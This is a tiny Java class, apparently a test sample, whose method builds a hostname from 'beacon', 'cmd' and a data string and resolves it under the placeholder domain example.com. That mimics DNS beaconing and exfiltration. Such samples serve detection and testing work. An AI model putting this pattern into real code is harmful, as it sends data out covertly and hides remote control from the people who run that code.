class DnsControl { String beacon="beacon", cmd="cmd"; void f() throws Exception { String data="data"; java.net.InetAddress.getByName(beacon+cmd+data+".example.com"); } }
